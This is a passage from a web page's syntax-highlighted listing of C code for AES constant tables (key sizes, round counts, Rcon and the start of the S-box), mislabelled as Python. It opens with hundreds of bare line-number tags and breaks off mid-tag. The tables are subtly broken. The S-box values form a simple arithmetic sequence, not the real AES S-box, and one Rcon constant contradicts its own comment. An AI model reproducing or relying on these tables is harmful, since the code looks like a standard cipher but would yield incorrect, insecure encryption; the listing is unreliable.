</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span><span class=lnt>435
</span><span class=lnt>436
</span><span class=lnt>437
</span><span class=lnt>438
</span><span class=lnt>439
</span><span class=lnt>440
</span><span class=lnt>441
</span><span class=lnt>442
</span><span class=lnt>443
</span><span class=lnt>444
</span><span class=lnt>445
</span><span class=lnt>446
</span><span class=lnt>447
</span><span class=lnt>448
</span><span class=lnt>449
</span><span class=lnt>450
</span><span class=lnt>451
</span><span class=lnt>452
</span><span class=lnt>453
</span><span class=lnt>454
</span><span class=lnt>455
</span><span class=lnt>456
</span><span class=lnt>457
</span><span class=lnt>458
</span><span class=lnt>459
</span><span class=lnt>460
</span><span class=lnt>461
</span><span class=lnt>462
</span><span class=lnt>463
</span><span class=lnt>464
</span><span class=lnt>465
</span><span class=lnt>466
</span><span class=lnt>467
</span><span class=lnt>468
</span><span class=lnt>469
</span><span class=lnt>470
</span><span class=lnt>471
</span><span class=lnt>472
</span><span class=lnt>473
</span><span class=lnt>474
</span><span class=lnt>475
</span><span class=lnt>476
</span><span class=lnt>477
</span><span class=lnt>478
</span><span class=lnt>479
</span><span class=lnt>480
</span><span class=lnt>481
</span><span class=lnt>482
</span><span class=lnt>483
</span><span class=lnt>484
</span><span class=lnt>485
</span><span class=lnt>486
</span><span class=lnt>487
</span><span class=lnt>488
</span><span class=lnt>489
</span><span class=lnt>490
</span><span class=lnt>491
</span><span class=lnt>492
</span><span class=lnt>493
</span><span class=lnt>494
</span><span class=lnt>495
</span><span class=lnt>496
</span><span class=lnt>497
</span><span class=lnt>498
</span><span class=lnt>499
</span><span class=lnt>500
</span><span class=lnt>501
</span><span class=lnt>502
</span><span class=lnt>503
</span><span class=lnt>504
</span><span class=lnt>505
</span><span class=lnt>506
</span><span class=lnt>507
</span><span class=lnt>508
</span><span class=lnt>509
</span><span class=lnt>510
</span><span class=lnt>511
</span><span class=lnt>512
</span><span class=lnt>513
</span><span class=lnt>514
</span><span class=lnt>515
</span><span class=lnt>516
</span><span class=lnt>517
</span><span class=lnt>518
</span><span class=lnt>519
</span><span class=lnt>520
</span><span class=lnt>521
</span><span class=lnt>522
</span><span class=lnt>523
</span><span class=lnt>524
</span><span class=lnt>525
</span><span class=lnt>526
</span><span class=lnt>527
</span><span class=lnt>528
</span><span class=lnt>529
</span><span class=lnt>530
</span><span class=lnt>531
</span><span class=lnt>532
</span><span class=lnt>533
</span><span class=lnt>534
</span><span class=lnt>535
</span><span class=lnt>536
</span><span class=lnt>537
</span><span class=lnt>538
</span><span class=lnt>539
</span><span class=lnt>540
</span><span class=lnt>541
</span><span class=lnt>542
</span><span class=lnt>543
</span><span class=lnt>544
</span><span class=lnt>545
</span><span class=lnt>546
</span><span class=lnt>547
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdint.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;memory.h&gt;</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>typedef</span> <span class=n>enum</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>AES_CYPHER_128</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AES_CYPHER_192</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AES_CYPHER_256</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>AES_CYPHER_T</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>Encryption</span> <span class=n>Rounds</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>g_aes_key_bits</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_128</span> <span class=o>*/</span> <span class=mi>128</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_192</span> <span class=o>*/</span> <span class=mi>192</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_256</span> <span class=o>*/</span> <span class=mi>256</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>g_aes_rounds</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_128</span> <span class=o>*/</span>  <span class=mi>10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_192</span> <span class=o>*/</span>  <span class=mi>12</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_256</span> <span class=o>*/</span>  <span class=mi>14</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>g_aes_nk</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_128</span> <span class=o>*/</span>  <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_192</span> <span class=o>*/</span>  <span class=mi>6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_256</span> <span class=o>*/</span>  <span class=mi>8</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>g_aes_nb</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_128</span> <span class=o>*/</span>  <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_192</span> <span class=o>*/</span>  <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>AES_CYPHER_256</span> <span class=o>*/</span>  <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>aes</span> <span class=n>Rcon</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>WARNING</span><span class=p>:</span> <span class=n>Rcon</span> <span class=ow>is</span> <span class=n>designed</span> <span class=n>starting</span> <span class=kn>from</span> <span class=mi>1</span> <span class=n>to</span> <span class=mi>15</span><span class=p>,</span> <span class=ow>not</span> <span class=mi>0</span> <span class=n>to</span> <span class=mf>14.</span>
</span></span><span class=line><span class=cl><span class=o>*</span>          <span class=n>FIPS</span><span class=o>-</span><span class=mi>197</span> <span class=n>Page</span> <span class=mi>9</span><span class=p>:</span> <span class=s2>&#34;note that i starts at 1, not 0&#34;</span>
</span></span><span class=line><span class=cl><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>i</span>    <span class=o>|</span>   <span class=mi>0</span>     <span class=mi>1</span>     <span class=mi>2</span>     <span class=mi>3</span>     <span class=mi>4</span>     <span class=mi>5</span>     <span class=mi>6</span>     <span class=mi>7</span>     <span class=mi>8</span>     <span class=mi>9</span>    <span class=mi>10</span>    <span class=mi>11</span>    <span class=mi>12</span>    <span class=mi>13</span>    <span class=mi>14</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=o>-----+------------------------------------------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=o>*</span>      <span class=o>|</span> <span class=p>[</span><span class=mi>01</span><span class=p>]</span>  <span class=p>[</span><span class=mi>02</span><span class=p>]</span>  <span class=p>[</span><span class=mi>04</span><span class=p>]</span>  <span class=p>[</span><span class=mi>08</span><span class=p>]</span>  <span class=p>[</span><span class=mi>10</span><span class=p>]</span>  <span class=p>[</span><span class=mi>20</span><span class=p>]</span>  <span class=p>[</span><span class=mi>40</span><span class=p>]</span>  <span class=p>[</span><span class=mi>80</span><span class=p>]</span>  <span class=p>[</span><span class=mi>1</span><span class=n>b</span><span class=p>]</span>  <span class=p>[</span><span class=mi>36</span><span class=p>]</span>  <span class=p>[</span><span class=mi>6</span><span class=n>c</span><span class=p>]</span>  <span class=p>[</span><span class=n>d8</span><span class=p>]</span>  <span class=p>[</span><span class=n>ab</span><span class=p>]</span>  <span class=p>[</span><span class=mi>4</span><span class=n>d</span><span class=p>]</span>  <span class=p>[</span><span class=mi>9</span><span class=n>a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>RCON</span> <span class=o>|</span> <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span>      <span class=o>|</span> <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span>      <span class=o>|</span> <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>  <span class=p>[</span><span class=mi>00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=n>static</span> <span class=n>const</span> <span class=n>uint32_t</span> <span class=n>g_aes_rcon</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x01000000</span><span class=p>,</span> <span class=mh>0x02000000</span><span class=p>,</span> <span class=mh>0x04000000</span><span class=p>,</span> <span class=mh>0x08000000</span><span class=p>,</span> <span class=mh>0x10000000</span><span class=p>,</span> <span class=mh>0x20000000</span><span class=p>,</span> <span class=mh>0x40000000</span><span class=p>,</span> <span class=mh>0x80000000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x1b000000</span><span class=p>,</span> <span class=mh>0x36000000</span><span class=p>,</span> <span class=mh>0x6c000000</span><span class=p>,</span> <span class=mh>0xd8000000</span><span class=p>,</span> <span class=mh>0xab000000</span><span class=p>,</span> <span class=mh>0xed000000</span><span class=p>,</span> <span class=mh>0x9a000000</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>aes</span> <span class=n>sbox</span> <span class=ow>and</span> <span class=n>invert</span><span class=o>-</span><span class=n>sbox</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=n>static</span> <span class=n>const</span> <span class=n>uint8_t</span> <span class=n>g_aes_sbox</span><span class=p>[</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=mi>0</span>     <span class=mi>1</span>     <span class=mi>2</span>     <span class=mi>3</span>   <span class=n>u</span>  <span class=mi>4</span>     <span class=mi>5</span>     <span class=mi>6</span>     <span class=mi>7</span>     <span class=mi>8</span>     <span class=mi>9</span>     <span class=n>A</span>     <span class=n>B</span>     <span class=n>C</span>     <span class=n>D</span>     <span class=n>E</span>     <span class=n>F</span>  <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x9C</span><span class=p>,</span> <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0xCA</span><span class=p>,</span> <span class=mh>0xE1</span><span class=p>,</span> <span class=mh>0xF8</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0xB0</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0xDE</span><span class=p>,</span> <span class=mh>0xF5</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x96</span><span class=p>,</span> <span class=mh>0xAD</span><span class=p>,</span> <span class=mh>0xC4</span><span class=p>,</span> <span class=mh>0xDB</span><span class=p>,</span> <span class=mh>0xF2</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0xAA</span><span class=p>,</span> <span class=mh>0xC1</span><span class=p>,</span> <span class=mh>0xD8</span><span class=p>,</span> <span class=mh>0xEF</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0xA7</span><span class=p>,</span> <span class=mh>0xBE</span><span class=p>,</span> <span class=mh>0xD5</span><span class=p>,</span> <span class=mh>0xEC</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x8D</span><span class=p>,</span> <span class=mh>0xA4</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0xD2</span><span class=p>,</span> <span class=mh>0xE9</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x8A</span><span class=p>,</span> <span class=mh>0xA1</span><span class=p>,</span> <span class=mh>0xB8</span><span class=p>,</span> <span class=mh>0xCF</span><span class=p>,</span> <span class=mh>0xE6</span><span class=p>,</span> <span class=mh>0xFD</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x9E</span><span class=p>,</span> <span class=mh>0xB5</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xE3</span><span class=p>,</span> <span class=mh>0xFA</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x9B</span><span class=p>,</span> <span class=mh>0xB2</span><span class=p>,</span> <span class=mh>0xC9</span><span class=p>,</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=mh>0xF7</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>,</span> <span class=mh>0xAF</span><span class=p>,</span> <span class=mh>0xC6</span><span class=p>,</span> <span class=mh>0xDD</span><span class=p>,</span> <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x95</span><span class=p>,</span> <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0xC3</span><span class=p>,</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=mh>0xF1</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x92</span><span class=p>,</span> <span class=mh>0xA9</span><span class=p>,</span> <span class=mh>0xC0</span><span class=p>,</span> <span class=mh>0xD7</span><span class=p>,</span> <span class=mh>0xEE</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0xA6</span><span class=p>,</span> <span class=mh>0xBD</span><span class=p>,</span> <span class=mh>0xD4</span><span class=p>,</span> <span class=mh>0xEB</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x8C</span><span class=p>,</span> <span class=mh>0xA3</span><span class=p>,</span> <span class=mh>0xBA</span><span class=p>,</span> <span class=mh>0xD1</span><span class=p>,</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xA0</span><span class=p>,</span> <span class=mh>0xB7</span><span class=p>,</span> <span class=mh>0xCE</span><span class=p>,</span> <span class=mh>0xE5</span><span class=p>,</span> <span class=mh>0xFC</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0x9D</span><span class=p>,</span> <span class=mh>0xB4</span><span class=p>,</span> <span class=mh>0xCB</span><span class=p>,</span> <span class=mh>0xE2</span><span class=p>,</span> <span class=mh>0xF9</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0x9A</span><span 